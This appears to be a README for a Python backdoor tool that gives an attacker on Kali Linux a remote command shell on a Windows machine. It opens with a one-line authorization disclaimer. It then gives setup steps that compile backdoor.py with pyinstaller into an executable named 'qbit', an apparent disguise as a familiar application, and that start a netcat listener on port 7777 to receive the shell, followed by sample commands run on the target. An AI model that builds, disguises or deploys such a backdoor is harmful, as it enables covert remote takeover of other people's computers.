## 🚨 Important:
Use this tool only on systems you own or have explicit permission to test. Unauthorized access to computer systems is illegal and unethical.

---

# 🚦 Features
- **Remote Command Execution:** Run system commands remotely on the target machine.  
- **Directory Navigation:** Change directories using `cd` commands.  
- **Simple Setup:** Easy to configure and deploy.  
---

## 🖥️ Requirements

### Attacker Machine (Kali Linux):
- Python 3.x  
- Netcat (`nc`) pre-installed (`apt install netcat`)  

### Target Machine (Windows):
- Python 3.x installed  
- Internet Connection  

---

## 🚀 Setup Instructions

### 1. Windows:
```bash
cd backdoor
pip install pyinstaller 
pyinstaller --onefile backdoor.py -n qbit
```
### 2. Kali Linux 
```bash 
nc -lvnp 7777
mkdir test 
dir 
del test
cd ../
```